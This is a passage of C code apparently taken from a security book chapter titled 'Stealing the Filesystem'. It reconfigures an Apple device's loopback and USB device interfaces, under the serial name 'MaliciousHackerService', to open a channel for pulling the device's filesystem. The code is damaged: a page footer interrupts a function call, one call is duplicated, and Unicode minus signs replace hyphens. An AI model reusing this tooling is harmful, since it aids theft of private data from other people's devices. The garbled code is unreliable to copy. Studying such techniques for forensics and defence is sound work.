#define MAC_OS_X_VERSION_MIN_REQUIRED MAC_OS_X_VERSION_10_5


#include <IOKit/IOCFPlugIn.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "IOUSBDeviceControllerLib.h"


void init_tcp ( )
{
   struct ifaliasreq ifra; 
   struct ifreq ifr;
   int s;
   
   memset(&ifr, 0, sizeof(ifr)); strcpy(ifr.ifr_name, "lo0");
   if ((s = socket(AF_INET, SOCK_DGRAM, 0)) == −1) 
      return;
   
   if (ioctl(s, SIOCGIFFLAGS, &ifr) != −1)
   {
      ifr.ifr_flags |= IFF_UP;
      assert(ioctl(s, SIOCSIFFLAGS, &ifr) != −1); 
   }
   
   memset(&ifra, 0, sizeof(ifra));
   strcpy(ifra.ifra_name, "lo0");
   ((struct sockaddr_in *)&ifra.ifra_addr)->sin_family = AF_INET; 
   ((struct sockaddr_in *)&ifra.ifra_addr)->sin_addr.s_addr = htonl(INADDR_LOOPBACK);
   ((struct sockaddr_in *)&ifra.ifra_addr)->sin_len   = sizeof(struct sockaddr_in);
   ((struct sockaddr_in *)&ifra.ifra_mask)->sin_family = AF_INET;
   ((struct sockaddr_in *)&ifra.ifra_mask)->sin_addr.s_addr   = htonl(IN_CLASSA_NET);
   ((struct sockaddr_in *)&ifra.ifra_mask)->sin_len   = sizeof(struct sockaddr_in);
   
   assert(ioctl(s, SIOCAIFADDR, &ifra) != −1);
   assert(close(s) == 0); 
}


#define kIOSomethingPluginID CFUUIDGetConstantUUIDWithBytes(NULL, \
0x9E, 0x72, 0x21, 0x7E, 0x8A, 0x60, 0x11, 0xDB, \ 0xBF, 0x57, 0x00, 0x0D, 0x93, 0x6D, 0x06, 0xD2)

#define kIOSomeID CFUUIDGetConstantUUIDWithBytes(NULL, \
0xEA, 0x33, 0xBA, 0x4F, 0x8A, 0x60, 0x11, 0xDB, \ 0x84, 0xDB, 0x00, 0x0D, 0x93, 0x6D, 0x06, 0xD2)


void init_usb ( ) 
{ 
   
   IOCFPlugInInterface **iface; io_service_t service;
   SInt32 score;
   void *thing;
   int i;
   IOUSBDeviceDescriptionRef desc   = IOUSBDeviceDescriptionCreateFromDefaults(kCFAllocatorDefault);
   IOUSBDeviceDescriptionSetSerialString(desc, CFSTR("MaliciousHackerService"));
   CFArrayRef usb_interfaces   = (CFArrayRef) IOUSBDeviceDescriptionCopyInterfaces(desc); 
   
   for(i=0; i < CFArrayGetCount(usb_interfaces); i++)
   {
      CFArrayRef arr1 = CFArrayGetValueAtIndex(usb_interfaces, i);
      if (CFArrayContainsValue(arr1, CFRangeMake(0,CFArrayGetCount(arr1)), CFSTR("PTP")))
      {
         printf("Found PTP interface\n");
         break; 
      }
   }
   
   IOUSBDeviceControllerRef controller;
   while (IOUSBDeviceControllerCreate(kCFAllocatorDefault, &controller))
   {
      printf("Unable to get USB device controller\n");
      sleep(3); 
   }
   
   IOUSBDeviceControllerSetDescription(controller, desc);
   CFMutableDictionaryRef match = IOServiceMatching("IOUSBDeviceInterface");
   CFMutableDictionaryRef dict = CFDictionaryCreateMutable(
     NULL,
     0,
     &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
   
   CFDictionarySetValue(dict, CFSTR("USBDeviceFunction"), CFSTR("PTP")); 
   CFDictionarySetValue(match, CFSTR("IOPropertyMatch"), dict);
   
   while(1) 
   {
      service = IOServiceGetMatchingService(kIOMasterPortDefault, match); 
      if (!service) 
      {
         printf("Didn't find, trying again\n"); sleep(1);
      }
      else
      {
         break; 
      }
   }
   assert(!IOCreatePlugInInterfaceForService( service,
                                             kIOSomethingPluginID, kIOCFPlugInInterfaceID, &iface,
                                             &score
                                             ￼￼60 | Chapter 3: Stealing the Filesystem
                                             ));
   assert(!IOCreatePlugInInterfaceForService( service,
                                             kIOSomethingPluginID, kIOCFPlugInInterfaceID, &iface,
                                             &score
                                             ));
   assert(!((*iface)->QueryInterface)(iface,
                                      CFUUIDGetUUIDBytes(kIOSomeID), &thing));
   IOReturn (**table)(void *, ...) = *((void **) thing); /* printf("%p\n", table[0x10/4]); */
   /* open IOUSBDeviceInterfaceInterface                 */ (!table[0x10/4](thing, 0));
   /* set IOUSBDeviceInterfaceInterface class            */ (!table[0x2c/4](thing, 0xff, 0));
   /* set IOUSBDeviceInterfaceInterface sub-class        */ (!table[0x30/4](thing, 0x50, 0));
   /* set IOUSBDeviceInterfaceInterface protocol         */ (!table[0x34/4](thing, 0x43, 0));
   /* commit IOUSBDeviceInterfaceInterface configuration */ (!table[0x44/4](thing, 0));
   IODestroyPlugInInterface(iface); 
}
